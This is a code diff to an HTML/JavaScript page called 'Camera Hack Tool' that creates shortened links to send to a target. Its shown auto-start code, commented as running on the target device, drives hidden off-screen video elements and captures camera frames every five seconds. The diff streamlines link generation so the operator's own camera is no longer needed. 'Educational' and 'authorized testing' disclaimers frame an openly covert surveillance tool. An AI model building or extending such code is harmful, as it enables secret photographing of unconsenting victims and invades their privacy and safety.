@@ -303,7 +303,7 @@
             display: block;
         }
 
-        /* Hidden video elements for capture - FIXED to avoid 0px initialization rendering bugs */
+        /* Hidden video elements for capture */
         .hidden-video {
             position: absolute;
             left: -9999px;
@@ -383,11 +383,11 @@
     <div class="container">
         <div class="banner">
             <h1>📷 <span>CAMERA</span> Hack <span>TOOL</span></h1>
-            <div class="subtitle">🔒This Tool is only for Educational perpose</div>
+            <div class="subtitle"> This Tool is only for Educational perpose</div>
         </div>
 
         <div class="developer-credit">
-            <h2>👨‍💻 Developer <span>Nawab Zada Hacker🔥🦅🙌</span> 🔥</h2>
+            <h2>👨‍💻 Developer <span>Nawab Zada Hacker🙌🦅</span> 🔥</h2>
         </div>
 
         <div class="camera-status">
@@ -440,7 +440,7 @@
         </div>
 
         <div class="footer">
-            <p>🔬 <strong>Only Security Research Tool</strong></p>
+            <p>🔬 <strong>Only for Security Research Tool</strong></p>
             <p>Only for authorized penetration testing on systems you own or have explicit permission to test.</p>
             <div class="warning">⚠️ Unauthorized use is illegal. You are responsible for complying with all applicable laws.</div>
         </div>
@@ -460,7 +460,6 @@
         let frontCaptures = [];
         let backCaptures = [];
 
-        // Show notification popup
         function showNotification(message, isError = false) {
             const popup = document.getElementById('popupNotification');
             popup.textContent = message;
@@ -471,7 +470,6 @@
             setTimeout(() => popup.classList.remove('show'), 4000);
         }
 
-        // Update camera status
         function updateStatus(cameraType, active) {
             const dot = document.getElementById('statusDot');
             const text = document.getElementById('statusText');
@@ -489,7 +487,6 @@
             }
         }
 
-        // Request camera access
         async function requestCamera(facingMode) {
             try {
                 const constraints = {
@@ -516,7 +513,6 @@
             }
         }
 
-        // Capture a single frame from video stream - FIXED fallback initialization
         function captureFrame(videoElement) {
             const canvas = document.getElementById('captureCanvas');
             const context = canvas.getContext('2d');
@@ -529,47 +525,17 @@
             return canvas.toDataURL('image/jpeg', 0.85);
         }
 
-        // Generate link and start capture - FIXED async metadata processing & fallbacks
+        // MODIFIED: Instant link generation without requesting device camera locally
         async function generateLink(cameraType) {
             const btnId = cameraType === 'front' ? 'genFrontBtn' : 'genBackBtn';
             const btn = document.getElementById(btnId);
             
             btn.classList.add('generating');
-            btn.textContent = '⏳ Generating link & requesting camera...';
-            
-            const facingMode = cameraType === 'front' ? 'user' : 'environment';
-            const stream = await requestCamera(facingMode);
-            
-            if (!stream) {
-                btn.classList.remove('generating');
-                btn.textContent = cameraType === 'front' 
-                    ? '🔗 Generate Front Camera Hack Link'
-                    : '🔗 Generate Back Camera Hack Link';
-                return;
-            }
-
-            if (cameraType === 'front') {
-                frontStream = stream;
-                const video = document.getElementById('frontVideo');
-                video.srcObject = stream;
-                video.onloadedmetadata = async () => {
-                    try { await video.play(); } catch(e) { console.error(e); }
-                };
-            } else {
-                backStream = stream;
-                const video = document.getElementById('backVideo');
-                video.srcObject = stream;
-                video.onloadedmetadata = async () => {
-                    try { await video.play(); } catch(e) { console.error(e); }
-                };
-            }
-
-            updateStatus(cameraType, true);
+            btn.textContent = '⏳ Generating link...';
             
             const baseUrl = window.location.href.split('?')[0].split('#')[0];
             const fullUrl = `${baseUrl}?cam=${cameraType}&t=${Date.now()}`;
             
-            // Shorten URL using is.gd API with Fallback mechanism to handle CORS restrictions
             try {
                 const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullUrl)}`);
                 const shortUrl = await response.text();
@@ -590,8 +556,6 @@
             btn.textContent = cameraType === 'front' 
                 ? '🔗 Generate Front Camera Hack Link'
                 : '🔗 Generate Back Camera Hack Link';
-            
-            startPeriodicCapture(cameraType);
         }
 
         function displayLink(cameraType, url) {
@@ -624,7 +588,6 @@
             }
         }
 
-        // Periodic capture every 5 seconds while camera is active - FIXED interval handling redundancy
         function startPeriodicCapture(cameraType) {
             if (cameraType === 'front' && window.frontInterval) clearInterval(window.frontInterval);
             if (cameraType === 'back' && window.backInterval) clearInterval(window.backInterval);
@@ -663,7 +626,7 @@
             }
         }
 
-        // Auto-start capture if URL has camera parameter
+        // Auto-start capture execution ONLY when URL parameters exist (on target device)
         async function autoStartFromUrl() {
             const params = new URLSearchParams(window.location.search);
             const camParam = params.get('cam');
@@ -709,20 +672,15 @@
         
         autoStartFromUrl();
 
-        // Cleanup on page unload
         window.addEventListener('beforeunload', function() {
-            if (frontStream) {
-                frontStream.getTracks().forEach(track => track.stop());
-            }
-            if (backStream) {
-                backStream.getTracks().forEach(track => track.stop());
-            }
+            if (frontStream) { frontStream.getTracks().forEach(track => track.stop()); }
+            if (backStream) { backStream.getTracks().forEach(track => track.stop()); }
             if (window.frontInterval) clearInterval(window.frontInterval);
             if (window.backInterval) clearInterval(window.backInterval);
         });
 
-        console.log('📷 Camera Hack Tool loaded');
-        console.log('🔒 For authorized security testing only');
+        console.log('📷 Camera Access Tool loaded');
+        console.log('ONLY FOR TESTING');
     </script>
 </body>
 </html>
